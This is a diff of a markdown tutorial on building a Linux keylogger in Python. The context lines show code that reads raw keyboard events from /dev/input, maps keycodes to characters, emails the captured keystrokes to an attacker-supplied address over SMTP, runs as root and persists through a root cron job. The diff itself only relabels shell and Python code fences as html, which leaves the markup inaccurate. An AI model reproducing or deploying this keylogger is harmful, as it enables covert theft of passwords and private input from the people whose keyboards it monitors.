@@ -18,7 +18,7 @@ In this tutorial, we will create a keylogger working on the Linux machine. Each 
 
 On Linux, everything is file! And the events do not escape the rule. But in which file should we look? We will first go to **/dev/**, that's where are the files of all devices. More precisely, we will go to **/dev/input/** because this folder contains all the input devices which in most cases it means the keyboard and the mouse. Using the command "`ls -la`" you can get a clear idea of the content of this folder in your machine.
 
-```bash
+```html
 ls -la /dev/input/
 ```
 
@@ -30,7 +30,7 @@ As you can see we are going to face our first problem! There are many folders, w
 
 To determinate which **eventX** is the correct one, we will have a look in **/proc/bus/input/devices**
 
-```bash
+```html
 cat /proc/bus/input/devices
 ```
 
@@ -54,7 +54,7 @@ So now that we have our devices and we know in which file they write their strea
 
 We will start by automating what we saw just before to find the right event file. The easiest way is to use regular expressions.
 
-```bash
+```html
 with open("/proc/bus/input/devices") as f:
     lines = f.readlines()
     pattern = re.compile("Handlers|EV=")
@@ -77,7 +77,7 @@ It only remains to find the type that matches the keyboard (Where we have "EV = 
 
 Are you curious like me? Let's see what happens if we directly listen to the keyboard event file:
 
-```bash
+```html
 cat /dev/input/event4
 ```
 
@@ -99,7 +99,7 @@ What you need to know is that the **eventX**, does not directly receive the char
 
 Below the piece of code that will help us to retrieve all the needed information's:
 
-```bash
+```html
 FORMAT = 'llHHI'
 EVENT_SIZE = struct.calcsize(FORMAT)
 in_file = open(infile_path, "rb")
@@ -125,7 +125,7 @@ We then check that the code is different from "0", which means that there was an
 
 We will need now to convert the value into a character. To do this we will simply define an "`array`" of all the possible values and the respective character. If you want to get a complete list of value, I recommend you to have a look in this [GitHub](https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h)) repository which gives the following python dictionary slightly adapted for an **azerty** keyboard:
 
-```bash
+```html
 qwerty_map = {
     2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
     11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
@@ -147,7 +147,7 @@ There are lots of techniques to achieve this! We can, for example, send the data
 
 For this tutorial, we will see the mails option, since it's something that Python allows you to do.
 
-```bash
+```html
 def sendEmail(message):
     msg = MIMEMultipart()
     password = PASS
@@ -174,7 +174,7 @@ def sendEmail(message):
 
 ### Wrap All The Code Together
 
-```python
+```html
 #!/usr/bin/env python3
 # -*-coding:Latin-1 -*
 
@@ -275,7 +275,7 @@ if __name__ == "__main__":
 ```
 Open your terminal, create a file called for example "keylogger.py" and copy and save the above script inside. Once you are done you must make this file executable by doing :
 
-```bash
+```html
 chmod +x keylogger.py
 ```
 
@@ -283,7 +283,7 @@ chmod +x keylogger.py
 
 To start your keylogger simply execute the below command using your email parameters. Also please note, to avoid any problem, we highly recommend executing this script with **root** privileges.
 
-```bash
+```html
 # Buffer size is the number of characters saved in memory before sending an email
 sudo python keylogger.py [email] [password] [smtp-server] [tls/notls] [buffer-size]
 ```
@@ -298,7 +298,7 @@ Linux offers us many possibilities to do this! For this tutorial, I choose to us
 
 The command to edit the **cron** configuration file is `crontab -e` (We execute it in root because our script needs root permissions to read the keyboard event\*)
 
-```bash
+```html
 sudo crontab -e
 ```
 
@@ -306,13 +306,13 @@ Once your crontab editor it's open, simply past the below configuration at the r
 
 ![Want to Create a Linux Keylogger Using Python? Here's How!](https://neoslab.com/uploads/medias/2020/02/want-to-create-a-linux-keylogger-using-python-here-s-how-4.png "Want to Create a Linux Keylogger Using Python? Here's How!")
 
-```bash
+```html
 00 */6 * * * ./path/to/keylogger.py [email] [password] [smtp-server] [tls/notls] [buffer-size]
 ```
 
 If you want to be sure that the rules of your crontab have been taken into account by your operating system, simply use the below command to get the list of all cron jobs.
 
-```bash
+```html
 sudo crontab -l
 ```
 To understand you have to know the syntax of cron: the numbers give the period when we start to execute the job (seconds, minutes, hours, days, days of the week, month, etc) and the command to execute follows, in our case, we run the keylogger every 6h.
